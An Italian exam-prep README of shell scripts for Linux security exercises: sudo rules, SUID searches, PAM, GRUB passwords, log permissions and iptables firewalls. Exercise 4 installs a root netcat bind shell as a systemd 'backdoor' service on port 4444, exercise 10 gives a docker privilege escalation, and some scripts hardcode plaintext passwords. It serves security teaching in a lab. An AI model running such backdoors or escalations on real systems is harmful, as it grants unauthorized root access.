# Repository di Supporto - Esame Cybersecurity 2026

## INDICE DEGLI ESERCIZI
1. [Esercizio 1: Configura sudo affinche un utente possa eseguire solo un comando specifico (es nmap)](#1)
2. [Esercizio 2: Configura sudo affinche un utente possa eseguire solo un comando specifico ma senza un parametro (es si puo eseguire nmap ma non nmap -p)](#2)
3. [Esercizio 3: Cercare tutti gli eseguibili con SUID/SGID](#3)
4. [Esercizio 4: Unit File Systemd (Backdoor Netcat)](#4)
5. [Esercizio 5: Configurazione Modulo PAM (Complessità Password)](#5)
6. [Esercizio 6: Hardening Bootloader GRUB (Password e Modifica Parametri)](#6)
7. [Esercizio 7: Hardening Permessi /var/log (Solo Root)](#7)
8. [Esercizio 8: Sudoers per Lettura Log (Privilegi Minimi CAT)](#8)
9. [Esercizio 9: Monitoraggio File Descriptor Attivi con LSOF](#9)
10. [Esercizio 10: Privilege Escalation tramite Docker (Gruppo Docker)](#10)
11. [Esercizio 11: Ricerca File/Cartelle Scrivibili da Chiunque (World-Writable) in /home](#11)
12. [Esercizio 12: Creazione utente con scadenza password](#12)
13. [Esercizio 13: Configura iptables solo ssh](#13)
14. [Esercizio 14: Configura iptables solo ssh da un ip e webserver](#14)
15. [Esercizio 15: Configura iptables blocco traffico internet tranne webserver](#15)
16. [Esercizio 16: Configura iptables solo ssh e webserver](#16)

## SSH
vm: ip a (vedi IP inet)
host: ssh username@IP

## Esecuzione
- nano es_1.sh
- inserisci il codice (ricorda prima riga #!/bin/bash)
- CTRL+O; INVIO; CTRL+X
- chmod +x es_1.sh
- ./es_1.sh
  
---
## 1
Configura sudo affinche un utente possa eseguire solo un comando specifico (es nmap)
```
#!/bin/bash

sudo apt update -y && sudo apt install nmap -y

# Alternativa elegante senza nessun echo
sudo tee /etc/sudoers.d/config_esame_nmap << 'EOF' > /dev/null
studente ALL=(root) NOPASSWD: /usr/bin/nmap
EOF

sudo chmod 0440 /etc/sudoers.d/config_esame_nmap
```
---

---
## 2
Configura sudo affinche un utente possa eseguire solo un comando specifico ma senza un parametro (es si puo eseguire nmap ma non nmap -p)
```
#!/bin/bash

# 1. Installazione silenziosa di nmap (se non presente)
sudo apt update -y && sudo apt install nmap -y

# 2. Configurazione della regola con wildcard e negazione (!)
sudo tee /etc/sudoers.d/config_esame_nmap_no_p << 'EOF' > /dev/null
studente ALL=(root) NOPASSWD: /usr/bin/nmap *, !/usr/bin/nmap *-p*
EOF

# 3. Blindatura dei permessi del file (obbligatorio 0440)
sudo chmod 0440 /etc/sudoers.d/config_esame_nmap_no_p
```
---
---
## 3
Cercare tutti gli eseguibili con SUID/SGID
```
#!/bin/bash
# Ricerca eseguibili SUID
find / -perm -4000 -type f 2>/dev/null (> ~/results.txt)

# Ricerca eseguibili SGID
find / -perm -2000 -type f 2>/dev/null
```
---
---
## 4
Creare uno unit file di Systemd per permettere una shell aperta a tutti sulla rete (netcat in modalità listen con il processo /bin/bash) e provare a connettersi dalla propria macchina usando netcat
```
#!/bin/bash
# 1. Installazione della versione tradizionale che supporta l'opzione -e
sudo apt update -y && sudo apt install netcat-traditional -y

# 2. Configura il sistema per usare netcat-traditional come default per 'nc'
sudo update-alternatives --set nc /bin/nc.traditional

# 3. Creazione dello Unit File
sudo tee /etc/systemd/system/backdoor.service << 'EOF' > /dev/null
[Unit]
Description=Backdoor Netcat Esame
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/bin/nc -lk -p 4444 -e /bin/bash
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# 4. Ricarica e avvio immediato
sudo systemctl daemon-reload
sudo systemctl enable --now backdoor.service

# Nota per il test: dalla tua macchina userai 'nc <IP_VM> 4444'
```
---
---
## 5
Installare e configurare un modulo PAM per richiedere caratteristiche minime alla password (min 8 caratteri, maiuscole, minuscole e simboli)
```
#!/bin/bash
sudo apt update -y && sudo apt install libpam-pwquality -y

# Controlla se il modulo è già configurato nel file
if ! grep -q "pam_pwquality.so" /etc/pam.d/common-password; then
    # Se NON è presente, lo aggiungiamo in modo sicuro
    sudo tee -a /etc/pam.d/common-password << 'EOF' > /dev/null
password requisite pam_pwquality.so retry=3 minlen=8 ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1
EOF
fi
```
---
---
## 6
Imposta una password a GRUB così da non permettere l'avvio del sistema operativo con parametri del kernel non standard
```
#!/bin/bash
# Password in chiaro: PasswordSicura123
# Generato con l'algoritmo di grub (pbkdf2)
HASH="grub.pbkdf2.sha512.10000.C61C39DBA8EA5C6BBA3E229B0762E90D78FEFE697DED85351BCB27BCE3E452DE1E9D7A5EF1BFED779CE22B694F9A680C0B0C40F00516E14BFF67A1869E4A9CF0.5F6F3A602B7853A5A1BE982269EFA00F5FFCC43A344933999DA0359C51D28F10AB60A7C3D8FA915A7545B0A21E368307D51D6855DE5AE3236746815FA1F60105"

# Creiamo il file custom in /etc/grub.d/
sudo tee /etc/grub.d/40_custom_password << EOF > /dev/null
set superusers="root"
password_pbkdf2 root $HASH
EOF

# Rende il boot standard non protetto, ma blocca l'editing dei parametri ('e')
sudo sed -i 's/CLASS="--class gnu-linux --class gnu --class os"/CLASS="--class gnu-linux --class gnu --class os --unrestricted"/' /etc/grub.d/10_linux

# Aggiorna GRUB
sudo update-grub
```
---
## 7)
Rendi la cartella /var/log leggibile solo da root
```
#!/bin/bash
# 1. Imposta root come proprietario e gruppo di /var/log e di tutto il suo contenuto (-R)
sudo chown -R root:root /var/log

# 2. Rendi la cartella leggibile, scrivibile ed eseguibile SOLO da root
sudo chmod 700 /var/log
```
---
---
## 8
Configura un utente per poter fare cat dei logs ma non essere amministratore (va configurato sudoers in modo opportuno)
```
#!/bin/bash
# Consente l'esecuzione del comando CAT su qualsiasi file in /var/log/
sudo tee /etc/sudoers.d/config_cat_logs << 'EOF' > /dev/null
studente ALL=(root) NOPASSWD: /usr/bin/cat /var/log/*
EOF

sudo chmod 0440 /etc/sudoers.d/config_cat_logs
```
---
---
## 9
Trova tutti i processi che hanno un file descriptor aperto dentro la cartella /var/log (il comando lsof tornerà comodo)
```
#!/bin/bash
sudo apt update -y && sudo apt install lsof -y

# Processi con FD aperti in /var/log
sudo lsof +D /var/log
```
---
---
## 10
Usa docker per effettuare un privilege escalation
```
#!/bin/bash
# Esegue il container con privilegi elevati (--privileged) e lancia direttamente il chroot
sudo docker run --privileged -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
```
---
---
## 11
Cercare se esiste un qualche file/cartella all'interno della home di un utente che sia scrivibile da tutti gli utenti
```
#!/bin/bash
# File scrivibili da chiunque in /home
find /home -type f -perm -o+w 2>/dev/null

# Cartelle scrivibili da chiunque in /home
find /home -type d -perm -o+w 2>/dev/null
```
---
---
## 12
Creare un utente con la password che scade ogni giorno
```
#!/bin/bash
# Creazione utente fittizio "utente-scadenza"
sudo useradd -m -s /bin/bash utente-scadenza
echo "utente-scadenza:Password123!" | sudo chpasswd

# Imposta il massimo dei giorni di validità della password a 1
sudo chage -M 1 utente-scadenza
```
---
---
## 13
Imposta Iptables affinchè sia permesso l'accesso alla macchina solo via SSH (TCP port 22)
```
#!/bin/bash
# Reset regole
sudo iptables -F
# Imposta Policy di Default (Blocca tutto in ingresso e inoltro, permetti in uscita)
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT

# Permetti traffico di Loopback (fondamentale) e connessioni già stabilite
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT

# Permetti SSH da ovunque
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
```
---
---
## 14
Imposta Iptables affinchè sia permesso l'accesso alla macchina solo via SSH (TCP port 22) dall'IP 1.2.3.4 e ad un webserver da qualunque IP (TCP port 80 e 443)
```
#!/bin/bash
sudo iptables -F
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT

sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT

# SSH filtrato per IP
sudo iptables -A INPUT -p tcp -s 1.2.3.4 --dport 22 -j ACCEPT
# Webserver aperto a tutti
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT
```
---
## 15
Imposta Iptables affinchè sia bloccato tutto il traffico Internet sulla macchina (gli utenti non possono navigare) ma sia funzionante il webserver (TCP port 80 e 443)
```
#!/bin/bash
sudo iptables -F
# Cambiamo la politica di OUTPUT in DROP per bloccare la navigazione verso l'esterno
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT DROP

# Permetti Loopback
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A OUTPUT -o lo -j ACCEPT

# Permetti il traffico in ingresso sul Webserver (80, 443) e le relative risposte in OUTPUT
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT
sudo iptables -A OUTPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT

# Consentiamo anche l'ingresso SSH per non rimanere chiusi fuori dalla VM durante il test
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
```
---
## 16
Imposta Iptables affinchè sia permesso l'accesso alla macchina solo via SSH (TCP port 22) e ad un webserver (TCP port 80 e 443)
```
#!/bin/bash
sudo iptables -F
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT

sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT

sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT
```
---
